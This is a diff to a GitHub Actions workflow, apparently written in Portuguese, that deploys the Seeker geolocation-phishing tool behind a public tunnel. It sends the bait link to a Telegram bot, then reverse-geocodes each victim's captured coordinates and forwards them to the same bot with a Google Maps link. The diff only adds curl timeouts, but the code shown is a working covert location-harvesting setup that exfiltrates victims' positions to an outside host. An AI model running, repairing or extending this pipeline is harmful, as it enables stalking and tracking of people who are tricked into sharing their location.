@@ -260,7 +260,7 @@ jobs:
           sleep 6
           if ! curl -sf -m 5 http://localhost:8080 > /dev/null; then
             MSGA=$(printf "SEEKER: app nao subiu. Log:\n%s" "$(tail -8 /tmp/seeker.log)")
-            curl -s -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" -d chat_id="${TG_CHAT}" --data-urlencode "text=${MSGA}" || true
+            curl -s -m 25 -4 -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" -d chat_id="${TG_CHAT}" --data-urlencode "text=${MSGA}" || true
             exit 1
           fi
           curl -sL -o /tmp/cf https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
@@ -275,12 +275,12 @@ jobs:
           echo "URL=$URL"
           if [ -z "$URL" ]; then
             MSGE=$(printf "SEEKER: nenhum tunel funcionou. cf.out:\n%s\nserveo:\n%s" "$(tail -4 /tmp/cf.out)" "$(tail -4 /tmp/serveo.out 2>/dev/null)")
-            curl -s -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" -d chat_id="${TG_CHAT}" --data-urlencode "text=${MSGE}" || true
+            curl -s -m 25 -4 -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" -d chat_id="${TG_CHAT}" --data-urlencode "text=${MSGE}" || true
             exit 1
           fi
           MSG=$(printf "SEEKER NO AR\nlink pra mandar:\n%s\n(quem abrir precisa permitir localizacao no navegador)" "$URL")
           for t in 1 2 3; do
-            RESP=$(curl -s -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" -d chat_id="${TG_CHAT}" --data-urlencode "text=${MSG}")
+            RESP=$(curl -s -m 25 -4 -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" -d chat_id="${TG_CHAT}" --data-urlencode "text=${MSG}")
             echo "$RESP" | grep -q '"ok":true' && break
             sleep 10
           done
@@ -295,7 +295,7 @@ jobs:
               END=$(curl -s -m 10 -A "sino-kali" "https://nominatim.openstreetmap.org/reverse?lat=${LAT}&lon=${LON}&format=json" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('display_name','endereco nao achado'))" 2>/dev/null || echo "geocodigo falhou")
               BLOCO=$(echo "$LIMPO" | grep -iA6 Latitude | tail -12)
               MSG2=$(printf "LOCALIZACAO PEGA (#%s):\n%s\n\nENDERECO: %s\nMaps: https://maps.google.com/?q=%s,%s" "$N" "$BLOCO" "$END" "$LAT" "$LON")
-              curl -s -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" -d chat_id="${TG_CHAT}" --data-urlencode "text=${MSG2}" || true
+              curl -s -m 25 -4 -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" -d chat_id="${TG_CHAT}" --data-urlencode "text=${MSG2}" || true
               ULT=$N
             fi
             echo "ciclo $i capturas=$N"
